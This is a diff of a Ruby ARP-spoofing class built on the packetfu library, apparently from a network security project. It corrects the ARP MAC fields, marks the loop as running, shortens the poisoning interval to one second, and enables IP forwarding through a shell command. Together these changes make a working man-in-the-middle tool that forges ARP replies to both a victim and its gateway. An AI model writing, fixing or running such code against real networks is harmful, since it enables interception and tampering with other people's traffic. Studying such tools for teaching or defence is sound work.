@@ -24,7 +24,7 @@
 #-------------------------------------------------------------------------------
 require 'rubygems'
 require 'packetfu'
-require './spoof.rb'
+require File.dirname(__FILE__) + '/spoof.rb'
 
 class ARPSpoof < Spoof
     
@@ -62,16 +62,16 @@ class ARPSpoof < Spoof
 
         @victim_packet.eth_saddr = cfg[:eth_saddr]
         @victim_packet.eth_daddr = victim_mac
-        @victim_packet.eth_saddr_mac = cfg[:eth_saddr]
-        @victim_packet.eth_daddr_mac = victim_mac
+        @victim_packet.arp_saddr_mac = cfg[:eth_saddr]
+        @victim_packet.arp_daddr_mac = victim_mac
         @victim_packet.arp_saddr_ip = gateway
         @victim_packet.arp_daddr_ip = victim_ip
         @victim_packet.arp_opcode = opcode
         
         @router_packet.eth_saddr = cfg[:eth_saddr]
         @router_packet.eth_daddr = cfg[:eth_daddr]
-        @router_packet.eth_saddr_mac = cfg[:eth_saddr]
-        @router_packet.eth_daddr_mac = cfg[:eth_daddr]
+        @router_packet.arp_saddr_mac = cfg[:eth_saddr]
+        @router_packet.arp_daddr_mac = cfg[:eth_daddr]
         @router_packet.arp_saddr_ip = victim_ip
         @router_packet.arp_daddr_ip = gateway
         @router_packet.arp_opcode = opcode
@@ -82,24 +82,6 @@ class ARPSpoof < Spoof
         end # if
         
     end # initialize
-    
-    #---------------------------------------------------------------------------
-    # send
-    #
-    # Send ARP packets to the Victim
-    #
-    # packet - packet to be sent
-    #
-    # Revisions: (Date and Description)
-    # 
-    # October 26, 2012
-    # Added argument (packet)
-    #
-    # Notes:
-    #---------------------------------------------------------------------------
-    #def send(packet)
-    #    packet.to_w(@interface)
-    #end # send
     
     #---------------------------------------------------------------------------
     # start
@@ -114,21 +96,23 @@ class ARPSpoof < Spoof
     # Notes:
     #---------------------------------------------------------------------------
     def start
+        puts "ARP Poisoning starting..."
         if @running then
             puts "Already running ARP Poisoning"
             return
         end
+        @running = true
         # Enable IP forwarding
         `echo 1 > /proc/sys/net/ipv4/ip_forward`
         while(@running)
-            sleep 5
+            sleep 1
             send(@victim_packet)
             send(@router_packet)
         end # while
     end # start
     
     #---------------------------------------------------------------------------
-    # send
+    # stop
     #
     # Stop ARP poisoning
     #
